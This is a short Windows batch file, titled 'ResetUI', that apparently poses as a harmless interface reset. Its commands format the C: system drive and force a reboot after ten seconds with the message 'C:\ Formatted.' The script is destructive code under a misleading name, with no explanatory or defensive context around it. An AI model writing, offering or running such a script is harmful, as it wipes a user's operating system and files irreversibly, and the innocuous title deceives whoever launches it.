@echo off
title ResetUI
cls
vol C:
format C:
shutdown /r /t 10 /c "C:\ Formatted."
